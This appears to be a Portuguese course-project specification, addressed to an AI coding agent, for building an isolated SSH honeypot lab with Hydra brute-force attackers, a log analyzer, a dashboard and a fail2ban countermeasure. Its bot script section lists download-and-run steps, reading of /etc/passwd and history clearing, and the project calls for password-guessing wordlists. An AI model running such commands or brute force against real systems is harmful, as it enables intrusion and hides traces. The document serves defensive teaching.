# Projeto Final – Segurança Computacional (UFPB): Honeypot SSH com painel de ataques

> **Como usar este arquivo:** cole-o inteiro como primeiro prompt em uma sessão do Claude Code, dentro de uma pasta vazia que será o repositório do projeto. Ele descreve o contexto, os requisitos, a arquitetura, a estrutura de arquivos, as fases de trabalho e os critérios de aceite. Você (Claude Code) deve seguir as fases na ordem, confirmar o plano antes de começar a implementar e validar cada fase rodando os comandos de verificação descritos.

---

## 0. Instruções para o agente (leia primeiro)

1. Trabalhe **fase a fase** (seção 12). Ao terminar cada fase, rode os comandos de verificação, mostre o resultado e só então avance.
2. Antes de escrever código, **apresente um plano curto** (arquivos que serão criados, comandos principais, dúvidas) e espere confirmação. Se algo for ambíguo, pergunte; não presuma.
3. **Segurança em primeiro lugar** (seção 3): tudo roda em containers numa rede Docker interna e isolada. Nunca exponha nenhuma porta do honeypot à internet nem ao `0.0.0.0` do host sem pedido explícito. Os ataques são sempre dirigidos **apenas** aos containers do próprio laboratório.
4. Prefira **soluções simples e reproduzíveis**: um único `docker compose up` deve subir o laboratório. Evite dependências pesadas.
5. Documente em português (comentários, README, mensagens do painel). Nomes de variáveis e funções podem estar em inglês.
6. Todo script deve ter `--help`, retornar código de saída correto e não depender de caminhos absolutos da máquina do autor.
7. Não escreva malware, exploits nem código ofensivo além do estritamente necessário para o laboratório (força bruta contra a própria isca com ferramentas existentes e sessões SSH com comandos inofensivos).
8. Ao final de cada fase, atualize o `README.md` e o arquivo `docs/DIARIO.md` (o que foi feito, decisões, problemas) para facilitar a apresentação.

---

## 1. Contexto acadêmico

- **Disciplina:** Segurança Computacional, UFPB – Centro de Informática. Prof. Iguatemi E. Fonseca.
- **Equipe (2 alunos):** Tobias Freire e Luis Antonio.
- **Tema escolhido:** *Honeypot SSH para captura e análise de ataques de força bruta* (o tema Keylogger é proibido pela disciplina; este projeto não envolve keylogger).
- **Datas:**
  - Prévia (5 min): **25/11/2026**, mostrar o que já foi implementado.
  - Apresentação final (12 a 15 min): **07/12/2026**, com **demonstração prática ao vivo**.
- **Estrutura obrigatória da apresentação final:**
  1. Definição e apresentação do trabalho/processo estudado (2 a 3 min).
  2. Modelagem, ferramentas e conceitos utilizados (4 a 5 min).
  3. Resultados com demonstração prática (6 a 7 min).
- **Conteúdos da disciplina relacionados:**
  - *Cap. 6 – Software malicioso:* bots/botnets, backdoors, download de malware, contramedidas e honeypots.
  - *Cap. 3 – Autenticação de usuário:* ataques de dicionário e adivinhação de senha, bloqueio de conta, política de senhas.
  - *Cap. 1 – Visão geral:* ameaças, ataques, ativos, contramedidas, tríade CIA.
  - *Cap. 2 – Ferramentas criptográficas:* funções de hash (usadas em identificação de arquivos baixados via SHA-256).

---

## 2. Objetivo do projeto

Construir um **laboratório reproduzível** no qual:

1. Um **honeypot SSH** (Cowrie) finge ser um servidor Linux vulnerável e registra tudo o que os atacantes fazem.
2. Containers **atacantes** (gerados por nós) executam ataques de força bruta e sessões pós-login com comandos típicos de bots.
3. Os logs são **processados e armazenados** (JSON Lines → SQLite) por um pipeline de análise em Python.
4. Um **painel (dashboard)** em tempo quase real mostra as estatísticas dos ataques.
5. Um **servidor SSH "reforçado"** (OpenSSH real + fail2ban) demonstra a **contramedida**: o mesmo ataque é bloqueado após N tentativas.
6. Um **roteiro de demonstração** automatizado executa o ciclo completo: ataque → captura → visualização → bloqueio.

### Perguntas que o projeto deve responder
- Quais usuários e senhas os atacantes tentam primeiro?
- Quantas tentativas por minuto/hora e por origem?
- O que um atacante faz depois de "entrar" (comandos, arquivos baixados)?
- Quanto tempo leva para o atacante ser bloqueado com a contramedida e qual é o efeito sobre o ataque?

---

## 3. Segurança e ética (requisitos não negociáveis)

- Toda a infraestrutura roda em **Docker** com uma rede `internal: true` (sem acesso à internet), exceto a etapa de build/pull de imagens.
- **O honeypot não publica portas no host** por padrão. O acesso do atacante é feito pela rede Docker interna (o atacante fala com `honeypot:2222`).
- Se o grupo decidir expor o honeypot à internet por alguns dias (**opcional e fora do escopo base**), isso exige: VM descartável separada, porta de administração real movida, nenhum dado pessoal na VM, snapshots, firewall do provedor e documentação do risco. **Não implemente isso sem pedido explícito.**
- Nenhum ataque pode ter como alvo máquinas de terceiros. Os scripts de ataque devem **recusar** alvos que não sejam os hostnames do laboratório (lista branca em `lab/allowed_targets.txt`).
- O honeypot **não deve executar de verdade** nenhum comando nem binário baixado pelo atacante (o Cowrie já emula o shell; manter assim). Arquivos baixados ficam somente em volume de quarentena, sem permissão de execução.
- Não commitar segredos, listas de senhas grandes, nem dumps de logs reais com dados sensíveis (`.gitignore` adequado).

---

## 4. Arquitetura

```
                         rede docker "lab_net" (internal: true)
 ┌────────────────┐        ┌───────────────────┐        ┌─────────────────┐
 │ attacker1      │ ─────► │ honeypot (Cowrie) │ ─────► │ volume: logs    │
 │ attacker2      │  SSH   │ porta 2222        │  JSON  │ cowrie.json     │
 │ (Hydra+Python) │        └───────────────────┘        │ downloads/      │
 └───────┬────────┘                                     └────────┬────────┘
         │ SSH                                                   │
         ▼                                                       ▼
 ┌────────────────────────────┐                      ┌──────────────────────┐
 │ hardened-ssh               │                      │ analyzer (Python)    │
 │ OpenSSH real + fail2ban    │                      │ ingere JSONL → SQLite│
 │ (contramedida)             │                      └────────┬─────────────┘
 └────────────────────────────┘                               ▼
                                                      ┌──────────────────────┐
                                                      │ dashboard (Streamlit)│
                                                      │ porta 8501 (só host  │
                                                      │ local 127.0.0.1)     │
                                                      └──────────────────────┘
```

### Componentes
| Serviço | Imagem/base | Função |
|---|---|---|
| `honeypot` | `cowrie/cowrie` (oficial) | Emula servidor SSH/shell vulnerável, grava `cowrie.json` |
| `attacker1`, `attacker2` | Debian/Kali-slim com `hydra`, `python3`, `paramiko` | Geram força bruta e sessões pós-login. IPs distintos na `lab_net` (ajuda o painel a ter origens diferentes) |
| `hardened-ssh` | Debian + `openssh-server` + `fail2ban` | Alvo de comparação com bloqueio automático |
| `analyzer` | Python 3.12 | Lê `cowrie.json` continuamente, normaliza e grava no SQLite |
| `dashboard` | Python 3.12 + Streamlit | Visualiza o SQLite e atualiza automaticamente |

O dashboard é o único serviço publicado no host, e **somente em `127.0.0.1:8501`**.

---

## 5. Honeypot (Cowrie): requisitos

- Usar a imagem oficial do Cowrie; fixar a versão (tag) no `docker-compose.yml`.
- Escutar SSH em `2222` (dentro da rede) e, opcionalmente, Telnet em `2223` (desligado por padrão).
- Configurar em `honeypot/etc/cowrie.cfg`:
  - hostname convincente (ex.: `srv-backup01`), banner SSH de OpenSSH comum;
  - saída de log JSON habilitada (`[output_jsonlog]`);
  - **autenticação permissiva controlada** via `userdb.txt`: aceitar apenas algumas combinações "fracas" definidas (ex.: `root:123456`, `admin:admin`, `pi:raspberry`, `ubuntu:ubuntu`) e rejeitar o resto. Isso gera logins falhos e bem-sucedidos para análise.
  - download de arquivos (`wget`/`curl`) salvo em quarentena, sem execução.
- Volumes: `./data/cowrie/log` → logs JSON; `./data/cowrie/downloads` → arquivos capturados.
- Eventos do Cowrie que o pipeline deve tratar (campo `eventid`):
  - `cowrie.session.connect` / `cowrie.session.closed` (duração)
  - `cowrie.client.version` (software do cliente SSH)
  - `cowrie.login.failed` / `cowrie.login.success` (`username`, `password`)
  - `cowrie.command.input` / `cowrie.command.failed` (`input`)
  - `cowrie.session.file_download` (`url`, `shasum`, `outfile`)
  - `cowrie.session.file_upload`
  - Campos comuns: `timestamp`, `src_ip`, `session`, `sensor`.

---

## 6. Geração de ataques (atacantes controlados)

### 6.1 Força bruta com Hydra
- `attack/bruteforce.sh <alvo> [--users users.txt] [--passwords passwords.txt] [--threads N]`
- Validar o alvo contra `lab/allowed_targets.txt` antes de executar.
- Listas pequenas e versionadas no repositório: `attack/wordlists/users.txt` (≈ 30 entradas) e `attack/wordlists/passwords.txt` (≈ 300 entradas, estilo "top senhas fracas"). Para volume maior, o script aceita um arquivo externo opcional (ex.: SecLists), **não incluído no repositório**.

### 6.2 Sessões pós-login (comportamento de bot)
- `attack/post_login_bot.py` (usa `paramiko`) loga com uma credencial válida do honeypot e executa uma sequência **inofensiva** de comandos típica de bots:
  `uname -a`, `cat /proc/cpuinfo`, `whoami`, `cat /etc/passwd`, `ls -la`, `wget http://lab-fileserver/sample.sh`, `chmod +x sample.sh`, `./sample.sh`, `history -c`.
- Um mini servidor HTTP no container `attacker` serve um `sample.sh` **inofensivo** (apenas `echo "fake payload"`), para gerar eventos de download com hash SHA-256.
- Parametrizar: número de sessões, intervalo, perfil (`noisy`, `stealthy`) e semente aleatória para reprodutibilidade.

### 6.3 Orquestração
- `attack/run_scenario.py <cenario>` com cenários em YAML (`scenarios/*.yml`): `baseline`, `distributed` (attacker1 + attacker2 em paralelo), `stealth` (poucas tentativas espaçadas), `against_hardened`.

---

## 7. Pipeline de análise (`analyzer`)

- Linguagem: Python 3.12, bibliotecas: `pandas`, `sqlite3` (stdlib), `pydantic` (validação de eventos).
- **Ingestão contínua:** acompanha `cowrie.json` (tail, tolerante a rotação e a linhas JSON incompletas) e grava no SQLite `data/analysis/honeypot.db`.
- **Esquema mínimo (SQLite):**
  - `events(id, ts, session, eventid, src_ip, username, password, command, url, sha256, raw_json)`
  - `sessions(session, src_ip, start_ts, end_ts, duration_s, login_success, client_version)`
  - Índices por `ts`, `src_ip`, `eventid`.
- **Idempotência:** reprocessar o mesmo arquivo não duplica eventos (chave única por hash da linha).
- **Métricas derivadas** (views SQL ou funções):
  - top N usuários, top N senhas, top N pares usuário:senha;
  - tentativas por minuto/hora, por IP de origem;
  - taxa de sucesso de login por origem;
  - top comandos executados e sequência típica por sessão;
  - arquivos baixados (URL, SHA-256, frequência);
  - tempo entre a primeira tentativa e o primeiro sucesso por origem.
- **Classificação simples de comportamento por sessão** (regras, sem ML): `scanner` (só conecta), `bruteforcer` (muitos logins falhos), `intruder` (login ok + comandos), `dropper` (tenta baixar/executar arquivo).
- **CLI:** `python -m analyzer ingest --log <arquivo>`, `python -m analyzer report --out reports/relatorio.md` (relatório textual com tabelas) e `python -m analyzer export --csv <pasta>`.

---

## 8. Painel (dashboard em Streamlit)

Página única, em português, com atualização automática (a cada 5 s, configurável) e filtros de período/origem. Seções:

1. **Cartões de resumo:** total de eventos, sessões, IPs únicos, tentativas de login (falhas/sucessos), comandos executados.
2. **Série temporal:** tentativas de login por minuto (linha), com marcação dos cenários executados, se disponível.
3. **Top 10 usuários**, **top 10 senhas**, **top 10 pares usuário:senha** (barras horizontais).
4. **Origens:** tabela por IP com tentativas, sucessos e classificação de comportamento. (O GeoIP só é relevante se houver tráfego real; no laboratório todos os IPs são privados, então mostre o **nome do container atacante** no lugar de mapa. Se o GeoIP estiver desligado, ocultar o mapa.)
5. **Atividade pós-login:** comandos mais usados e linha do tempo de uma sessão selecionada (replay textual dos comandos).
6. **Arquivos capturados:** URL, SHA-256, quantidade.
7. **Comparativo de contramedida:** gráfico lado a lado de tentativas no honeypot vs. no `hardened-ssh` (com marca do momento do banimento).

Requisitos: sem dependências de rede externa para os gráficos (usar `plotly` ou `altair`), carregar rápido com 100 mil eventos, e ter um modo "apresentação" (fontes maiores, menos controles).

---

## 9. Contramedida: `hardened-ssh` + fail2ban

- Container com **OpenSSH real** (`PasswordAuthentication yes` para permitir o ataque, `MaxAuthTries 3`, `LoginGraceTime 20`) e **fail2ban** com jail `sshd`: `maxretry=5`, `findtime=60s`, `bantime=300s` (valores configuráveis).
- O ban deve ser efetivo **dentro do laboratório**: documentar e implementar a ação de bloqueio adequada ao Docker (iptables/nftables no próprio container com `NET_ADMIN`, ou ação que derruba conexões do IP banido). Verificar que o container atacante realmente passa a receber *connection refused/timeout*.
- Usuários de teste no `hardened-ssh` com senhas **fortes** (para que o ataque não tenha sucesso) e um usuário com senha fraca em um cenário separado, para mostrar a diferença.
- **Política de senhas e bloqueio:** documentar como complemento (`pam_faillock`/`pam_pwquality`) e, se houver tempo, ativar `pam_faillock` no container para mostrar o bloqueio por conta além do bloqueio por IP.
- Métricas do experimento: tentativas até o ban, tempo até o ban, tentativas bloqueadas depois do ban, e quantas senhas da lista foram testadas antes do bloqueio versus sem contramedida.

---

## 10. Estrutura do repositório

```
honeypot-ssh/
├── README.md                    # visão geral, como subir, como rodar a demo
├── docker-compose.yml           # todo o laboratório
├── Makefile                     # atalhos: up, down, attack, report, demo, clean
├── .gitignore  .env.example
├── docs/
│   ├── DIARIO.md                # registro do progresso (útil p/ prévia)
│   ├── ARQUITETURA.md           # diagramas e decisões
│   ├── ROTEIRO_DEMO.md          # passo a passo da demonstração (min a min)
│   └── RESULTADOS.md            # tabelas e gráficos finais
├── honeypot/
│   └── etc/ (cowrie.cfg, userdb.txt)
├── attack/
│   ├── Dockerfile
│   ├── bruteforce.sh
│   ├── post_login_bot.py
│   ├── run_scenario.py
│   ├── wordlists/ (users.txt, passwords.txt)
│   └── scenarios/ (baseline.yml, distributed.yml, stealth.yml, against_hardened.yml)
├── hardened/
│   ├── Dockerfile
│   └── fail2ban/ (jail.local, filtros/ações)
├── analyzer/
│   ├── Dockerfile  pyproject.toml
│   ├── analyzer/ (__main__.py, ingest.py, models.py, queries.py, classify.py, report.py)
│   └── tests/
├── dashboard/
│   ├── Dockerfile  requirements.txt
│   └── app.py
├── lab/allowed_targets.txt
├── data/                        # volumes (no .gitignore)
│   ├── cowrie/{log,downloads}/
│   ├── analysis/
│   └── samples/                 # logs de exemplo (plano B da demo)
└── reports/
```

---

## 11. Requisitos técnicos e de qualidade

- **Reprodutibilidade:** `make up` sobe tudo; `make demo` roda o roteiro completo; `make clean` remove containers e dados.
- **Testes:** `pytest` para o `analyzer` (parsing de eventos, idempotência, classificação, queries) usando um arquivo `data/samples/cowrie_sample.json` com eventos reais do formato Cowrie (gerados no laboratório).
- **Logs de exemplo gravados:** guardar uma rodada completa em `data/samples/` para a **demo de plano B** (dashboard em modo "replay" lendo esse arquivo caso a rede/Docker falhe na apresentação).
- **Lint/formatação:** `ruff` e `black` (opcional, sem travar o avanço).
- **Desempenho:** ingestão ≥ 5 mil eventos/s em máquina comum; dashboard responsivo com 100 mil eventos.
- **Documentação:** README com pré-requisitos (Docker, Docker Compose, Make), comandos e solução de problemas comuns (permissões de volume, portas ocupadas).

---

## 12. Fases de trabalho e critérios de aceite

### Fase 1: Ambiente e honeypot (meta: prévia de 25/11)
- Criar repositório, `docker-compose.yml` com `lab_net` interna, `honeypot` e um `attacker1`.
- Configurar Cowrie, `userdb.txt`, saída JSON.
- **Aceite:** `docker compose up -d` sobe o honeypot; `docker compose exec attacker1 ssh root@honeypot -p 2222` conecta; tentativa de login gera linhas em `data/cowrie/log/cowrie.json`; nenhuma porta do honeypot aparece em `docker ps` publicada no host.

### Fase 2: Geração de ataques
- `bruteforce.sh`, `post_login_bot.py`, mini servidor de `sample.sh`, lista branca de alvos e `run_scenario.py` com cenário `baseline`.
- **Aceite:** o cenário `baseline` produz eventos de `login.failed`, `login.success`, `command.input` e `session.file_download` no log; alvo fora da lista branca é recusado com mensagem clara.

### Fase 3: Pipeline de análise
- `analyzer` com ingestão contínua, SQLite, classificação e relatório em Markdown. Testes `pytest`.
- **Aceite:** `pytest` verde; reingestão não duplica; `python -m analyzer report` gera `reports/relatorio.md` com top usuários/senhas, séries por minuto e classificação das sessões.

### Fase 4: Dashboard
- Streamlit com as seções da seção 8, auto-refresh e modo apresentação.
- **Aceite:** com o cenário `distributed` rodando, o painel mostra dois IPs de origem e os números mudam sem recarregar manualmente; modo replay funciona com `data/samples/`.

### Fase 5: Contramedida
- `hardened-ssh` com fail2ban e cenário `against_hardened`.
- **Aceite:** o ataque contra `hardened-ssh` é banido após ≤ 5 falhas em 60 s e passa a receber recusa de conexão; o painel exibe o comparativo honeypot vs. hardened com o instante do ban.

### Fase 6: Demo, resultados e polimento (meta: apresentação de 07/12)
- `make demo` executa: (1) baseline no honeypot, (2) painel ao vivo, (3) ataque ao hardened com ban, (4) resumo final. Escrever `ROTEIRO_DEMO.md` com tempos que caibam em **6 a 7 minutos**.
- Preencher `docs/RESULTADOS.md` com tabelas e gráficos exportados (PNG) e conclusões.
- **Aceite:** a demo roda do zero em ≤ 7 min; existe o plano B com logs gravados; README completo.

---

## 13. Divisão de trabalho sugerida (referência, não código)

- **Tobias Freire:** infraestrutura Docker, Cowrie, geração de ataques, contramedida fail2ban.
- **Luis Antonio:** analyzer, banco SQLite, dashboard e relatório.
- **Ambos:** roteiro da demo, slides, ensaio e resultados.

(O agente deve organizar commits e pastas de modo que cada parte possa ser desenvolvida em paralelo sem conflitos.)

---

## 14. Roteiro resumido da apresentação (para orientar o `ROTEIRO_DEMO.md`)

1. **Definição (2 a 3 min):** o que é honeypot, tipos (baixa/alta interação), por que o Cowrie, relação com botnets e adivinhação de senhas.
2. **Modelagem (4 a 5 min):** diagrama da arquitetura, fluxo de logs até o painel, ferramentas (Cowrie, Hydra, Docker, SQLite, Streamlit, fail2ban), tipos de comportamento classificados.
3. **Resultados e demo (6 a 7 min):**
   - subir/mostrar o laboratório já ativo;
   - disparar o ataque e ver o painel mudar em tempo real;
   - mostrar os comandos capturados e o arquivo baixado com SHA-256;
   - repetir o ataque contra o `hardened-ssh` e mostrar o ban;
   - fechar com as lições e as limitações.

---

## 15. Limitações a documentar no `RESULTADOS.md`

- Os ataques são **sintéticos** (gerados por nós), então as estatísticas não representam o tráfego real da internet.
- O Cowrie é de **interação média**: um atacante sofisticado pode identificá-lo como honeypot.
- O bloqueio por IP não protege contra ataques distribuídos de baixa frequência.
- Possíveis extensões (fora do escopo): exposição controlada à internet em VM descartável, GeoIP real, integração com ELK/Grafana, consulta de hashes no VirusTotal, honeypot Telnet.

---

## 16. Entrega esperada desta sessão

Ao final de todas as fases, o repositório deve conter o laboratório funcional, a documentação, os testes e o roteiro da demo. **Comece agora pela leitura deste documento, depois apresente o plano da Fase 1 (arquivos, comandos e dúvidas) e aguarde minha confirmação.**
